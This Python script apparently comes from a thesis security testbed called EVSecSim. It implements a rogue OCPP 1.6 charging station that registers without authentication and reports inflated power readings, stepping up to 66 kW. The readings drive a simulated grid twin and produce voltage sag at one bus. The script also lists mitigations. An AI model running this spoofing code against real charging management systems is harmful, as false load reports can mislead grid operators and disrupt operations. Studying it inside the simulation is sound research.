"""
===========================================================================
EVSecSim — Attack #7: Single EVSE Grid Overload + PGTwin Introduction
===========================================================================

WHAT THIS IS
------------
The simplest possible PGTwin integration attack: a single compromised or
rogue EVSE sends MeterValues with progressively inflated power readings.

OCPP 1.6 has no mechanism for the CSMS to verify a reported kW value
against the charger's physical rating or a smart-meter cross-check.  A
rogue unit can therefore report 66 kW while physically idle, and the
operator's grid model will react as if that load is real.

This attack is intentionally simpler than the botnet attack (Attack #8).
Its purpose is to:
  1. Introduce the OCPP → PGTwin coupling (one charger, one shared file)
  2. Produce a clear, step-wise voltage sag at Bus 44 with each load step
  3. Establish the vm_pu baseline before the more complex attacks

ATTACK STEPS
------------
  Step 0 —  0 kW : no EV, pure baseline          → vm_pu ≈ 0.9689
  Step 1 — 11 kW : nominal Level-2 AC charger    → vm_pu ≈ 0.9662
  Step 2 — 22 kW : 2× nominal (over-report)      → vm_pu ≈ 0.9632
  Step 3 — 44 kW : 4× nominal                    → vm_pu ≈ 0.9575
  Step 4 — 66 kW : 6× nominal, near headroom     → vm_pu ≈ 0.9517
  Step 5 —  0 kW : cleanup, bus recovers

Generator headroom is 70.7 kW (slack at 1360.7 kW − base loads 1290 kW).
All steps stay within headroom so runpp() converges at every step.

GRID IMPACT METRIC (from SimOutputBus.csv)
------------------------------------------
  Column vm_pu45 = Bus 44 voltage (EV injection bus, DS4, 0.4 kV)
  Decreases monotonically with each load step; recovers on cleanup.

THREAT MODEL
------------
  Single rogue EVSE on public-net.  No CP authentication in OCPP 1.6 —
  any client can connect and report any power value.

HOW TO RUN
----------
  docker compose --profile overload-grid up

  Watch pgtwin container logs for real-time vm_pu readings per step.
  SimOutputBus.csv on the shared volume records the full step history.
===========================================================================
"""

import asyncio
import os
import time
import warnings
from datetime import datetime, timezone

import websockets
from ocpp.v16 import ChargePoint as cp, call
from ocpp.v16.enums import RegistrationStatus

warnings.filterwarnings('ignore')

# ===========================================================================
# CONFIG
# ===========================================================================

CSMS_URL        = os.environ.get('CSMS_URL', 'ws://csms:9000')
EV_LOAD_FILE    = os.environ.get('EV_LOAD_FILE', '/shared/ev_load_kw.txt')

OVERLOAD_STEPS_KW = [0.0, 11.0, 22.0, 44.0, 66.0, 0.0]   # kW per step
STEP_DURATION_S   = 20    # seconds each step is held
METER_INTERVAL_S  = 2     # MeterValues send frequency within each step

# ===========================================================================
# COLOUR HELPERS
# ===========================================================================

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def ts():
    return datetime.now().strftime("%H:%M:%S")

def log_atk(msg):  print(f"{RED}[ATK {ts()}]{RESET} {msg}")
def log_grid(msg): print(f"{CYAN}[GRD {ts()}]{RESET} {msg}")
def log_ok(msg):   print(f"{GREEN}[OK  {ts()}]{RESET} {msg}")

# ===========================================================================
# SHARED FILE WRITER
# ===========================================================================

def write_ev_load(kw: float):
    try:
        os.makedirs(os.path.dirname(EV_LOAD_FILE), exist_ok=True)
        with open(EV_LOAD_FILE, 'w') as f:
            f.write(str(round(kw, 3)))
    except Exception as e:
        print(f"[ATK7] EV load file write error: {e}")

# ===========================================================================
# ROGUE CHARGE POINT
# ===========================================================================

class OverloadCP(cp):
    """A single rogue charger that reports inflated power to the CSMS."""

    async def register(self) -> bool:
        try:
            resp = await self.call(call.BootNotification(
                charge_point_vendor="Rogue-Vendor",
                charge_point_model="OverloadCP-100kW",
            ))
            return resp.status == RegistrationStatus.accepted
        except Exception:
            return False

    async def send_power(self, power_kw: float):
        try:
            await self.call(call.MeterValues(
                connector_id=1,
                meter_value=[{
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "sampledValue": [{
                        "value":     str(round(power_kw, 2)),
                        "measurand": "Power.Active.Import",
                        "unit":      "kW",
                    }]
                }]
            ))
            write_ev_load(power_kw)
        except Exception:
            pass

# ===========================================================================
# MAIN
# ===========================================================================

async def main():
    print(f"\n{BOLD}{RED}{'='*62}{RESET}")
    print(f"{BOLD}{RED}  EVSecSim — Attack #7: Single EVSE Grid Overload{RESET}")
    print(f"{BOLD}{RED}{'='*62}{RESET}\n")
    print(f"  CSMS           : {CSMS_URL}")
    print(f"  EV load file   : {EV_LOAD_FILE}")
    print(f"  Load steps     : {OVERLOAD_STEPS_KW} kW")
    print(f"  Step duration  : {STEP_DURATION_S}s  |  MV interval: {METER_INTERVAL_S}s")
    print(f"  Grid target    : Load4 Bus 44 (DS4, 0.4 kV, small industry)\n")

    os.makedirs(os.path.dirname(EV_LOAD_FILE), exist_ok=True)

    try:
        async with websockets.connect(CSMS_URL, ping_interval=None) as ws:
            await ws.send("ATK7-OVERLOAD-001")
            charger = OverloadCP("ATK7-OVERLOAD-001", ws)
            start_task = asyncio.create_task(charger.start())

            if not await charger.register():
                print(f"{RED}Registration failed — is the CSMS running?{RESET}")
                start_task.cancel()
                return

            log_ok("Registered with CSMS — no CP authentication required")

            for step_idx, step_kw in enumerate(OVERLOAD_STEPS_KW):
                if step_kw == 0.0 and step_idx == 0:
                    label = "BASELINE — no EV load"
                    colour = GREEN
                elif step_kw == 0.0:
                    label = "CLEANUP — load cleared, bus recovers"
                    colour = GREEN
                else:
                    label = f"OVERLOAD STEP {step_idx} — {step_kw:.0f} kW reported"
                    colour = RED

                print(f"\n{BOLD}{colour}{'='*62}{RESET}")
                print(f"{BOLD}{colour}  {label}{RESET}")
                print(f"{BOLD}{colour}{'='*62}{RESET}\n")

                t0 = time.perf_counter()
                tick = 0
                while time.perf_counter() - t0 < STEP_DURATION_S:
                    await charger.send_power(step_kw)
                    tick += 1
                    log_grid(f"Step {step_idx} | {step_kw:5.1f} kW → ev_load_kw.txt | tick {tick:2d}")
                    await asyncio.sleep(METER_INTERVAL_S)

            write_ev_load(0.0)
            log_ok("Grid load file cleared — Bus 44 returning to baseline vm_pu")

            print(f"\n{BOLD}{CYAN}{'='*62}{RESET}")
            print(f"{BOLD}{CYAN}  ATTACK 7 COMPLETE{RESET}")
            print(f"{BOLD}{CYAN}{'='*62}{RESET}\n")
            print(f"  Load steps     : {OVERLOAD_STEPS_KW} kW")
            print(f"  Grid target    : Load4 Bus 44 (DS4, 0.4 kV)")
            print()
            print(f"  {YELLOW}Grid evidence (read SimOutputBus.csv from shared volume):{RESET}")
            print(f"  - Column vm_pu45: Bus 44 voltage — decreases with each step")
            print(f"  - Expected:  0 kW → 0.9689 pu")
            print(f"               11 kW → 0.9662 pu")
            print(f"               22 kW → 0.9632 pu")
            print(f"               44 kW → 0.9575 pu")
            print(f"               66 kW → 0.9517 pu")
            print(f"                0 kW → 0.9689 pu  (recovery)")
            print()
            print(f"  {YELLOW}Thesis evidence checklist:{RESET}")
            print(f"  [x] Single rogue EVSE: no authentication, any ID accepted")
            print(f"  [x] Inflated MeterValues accepted by CSMS without verification")
            print(f"  [x] Each load step produces measurable Bus 44 voltage sag")
            print(f"  [x] Grid impact monotonically proportional to reported kW")
            print(f"  [x] Full recovery after load cleared (confirms coupling)")
            print()
            print(f"  {CYAN}Mitigation:{RESET}")
            print(f"  - OCPP 2.0.1 operator-signed SetChargingProfile limits per CP")
            print(f"  - CSMS plausibility check: reported kW vs rated connector capacity")
            print(f"  - Smart meter cross-check: CSMS vs physical metering data")

            start_task.cancel()
            try:
                await start_task
            except (asyncio.CancelledError,
                    websockets.exceptions.ConnectionClosedOK):
                pass

    except ConnectionRefusedError:
        print(f"{RED}Cannot reach CSMS at {CSMS_URL}{RESET}")
    except KeyboardInterrupt:
        write_ev_load(0.0)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        write_ev_load(0.0)
